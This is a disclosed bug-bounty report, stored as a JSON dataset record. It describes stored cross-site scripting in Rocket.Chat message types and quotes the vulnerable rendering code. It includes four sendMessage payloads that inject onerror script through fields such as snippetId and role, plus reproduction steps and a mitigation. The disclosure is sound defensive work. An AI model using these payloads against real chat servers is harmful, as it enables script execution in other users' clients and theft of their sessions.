{
  "reported_to": "Rocket.Chat",
  "reported_by": "gronke ",
  "title": "XSS in various MessageTypes",
  "content": "\nSummary\nRendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client.\nDescription\nMessages in Rocket.Chat can have various types that influence the rendering as seen in app/ui-message/client/message.js#L24-L53:\nCode 895 Bytes\n1const renderBody = (msg, settings) => {\n2\tconst searchedText = msg.searchedText ? msg.searchedText : '';\n3\tconst isSystemMessage = MessageTypes.isSystemMessage(msg);\n4\tconst messageType = MessageTypes.getType(msg) || {};\n5\n6\tif (messageType.render) {\n7\t\tmsg = messageType.render(msg);\n8\t} else if (messageType.template) {\n9\t\t// render template\n10\t} else if (messageType.message) {\n11\t\tmsg.msg = escapeHTML(msg.msg);\n12\t\tmsg = TAPi18n.__(messageType.message, { ...typeof messageType.data === 'function' && messageType.data(msg) });\n13\t} else if (msg.u && msg.u.username === settings.Chatops_Username) {\n14\t\tmsg.html = msg.msg;\n15\t\tmsg = renderMentions(msg);\n16\t\tmsg = msg.html;\n17\t} else {\n18\t\tmsg = renderMessageBody(msg);\n19\t}\n20\n21\tif (isSystemMessage) {\n22\t\tmsg.html = Markdown.parse(msg.html);\n23\t}\n24\n25\tif (searchedText) {\n26\t\tmsg = msg.replace(new RegExp(searchedText, 'gi'), (str) => `<mark>${ str }</mark>`);\n27\t}\n28\n29\treturn msg;\n30};\nThese MessageTypes are registered on startup of Rocket.Chat, like in this example the Message Snippeting Feature app/message-snippet/client/messageType.js#L4-L16\nCode 394 Bytes\n1import { MessageTypes } from '../../ui-utils';\n2\n3Meteor.startup(function() {\n4\tMessageTypes.registerType({\n5\t\tid: 'message_snippeted',\n6\t\tsystem: true,\n7\t\tmessage: 'Snippeted_a_message',\n8\t\tdata(message) {\n9\t\t\tconst snippetLink = `<a href=\"/snippet/${ message.snippetId }/${ encodeURIComponent(message.snippetName) }\">${ escapeHTML(message.snippetName) }</a>`;\n10\t\t\treturn { snippetLink };\n11\t\t},\n12\t});\n13});\nUnlike most other MessageTypes, not the messages sanitized msg parameter is rendered, but snippetName and snippetId. The unsanitized message.snippetId leads to arbitrary script execution in the client displaying a maliciously crafted message.\nCode 219 Bytes\n1Meteor.call(\"sendMessage\", {\n2  rid: \"<ROOM_ID>\",\n3  msg: \"\",\n4  t: \"message_snippeted\",\n5  snippetId: \"\\\"><img src=x onerror=alert(1) style=\\\"display: none;\\\" x=\\\"\",\n6  snippetName: \"\"\n7}, (...args) => console.log(...args));\nAnother MessageTypes have been found to be affected similarly:\nCode 173 Bytes\n1Meteor.call(\"sendMessage\", {\n2  rid: \"<ROOM_ID>\",\n3  msg: \"\",\n4  t: \"subscription-role-removed\",\n5  role: \"<img src=x onerror=alert(1) />\"\n6}, (...args) => console.log(...args));\nCode 246 Bytes\n1Meteor.call(\"sendMessage\", {\n2  rid: \"<ROOM_ID>\",\n3  msg: \"\",\n4  t: \"livechat_transfer_history\",\n5  transferData: {\n6    scope: \"agent\",\n7    transferredTo: {\n8      name: \"<img src=x onerror=alert(1) />\"\n9    }\n10  }\n11}, (...args) => console.log(...args));\nCode 182 Bytes\n1Meteor.call(\"sendMessage\", {\n2  rid: \"<ROOM_ID>\",\n3  msg: \"\",\n4  t: \"omnichannel_placed_chat_on_hold\",\n5  comment: \"<img src=x onerror=alert(1) />\"\n6}, (...args) => console.log(...args));\nReleases Affected:\n3.18.2\n4.0.3\nSteps To Reproduce (from initial installation to vulnerability):\n1.) Login to Rocket.Chat\n2.) Find any Room ID (window URL path from direct messages or avatar image path from channels)\n3.) Call sendMessage Meteor Method with t parameter and the affected source parameter\nSuggested mitigation\nSanitize message parameters rendered from MessageType render or data functions\nImpact\nAuthenticated adversaries can craft messages that exploit XSS in the displaying frontend clients.\n\n",
  "severity": [
    8.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1723341300,
  "report_url": "https://hackerone.com/reports/1379400",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Login to Rocket.Chat"
    ],
    [
      2,
      "Find any Room ID (window URL path from direct messages or avatar image path from channels)"
    ],
    [
      3,
      "Call sendMessage Meteor Method with t parameter and the affected source parameter"
    ]
  ],
  "vuln_description": "Rendering messages of various MessageTypes can lead to arbitrary script execution in the receiving frontend client. The vulnerability arises from unsanitized message parameters in certain MessageTypes, allowing authenticated adversaries to craft messages that exploit XSS in the displaying frontend clients.",
  "reason": "The vulnerability involves understanding the MessageTypes rendering mechanism and identifying unsanitized parameters in specific MessageTypes. While the attack requires knowledge of the Rocket.Chat message system, the steps to exploit are straightforward once the vulnerable MessageTypes are identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves XSS in message rendering, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing AuthN/AuthZ boundaries by swapping user sessions and resource IDs, not on detecting XSS vulnerabilities in message rendering.",
    "is_detectable": false
  }
}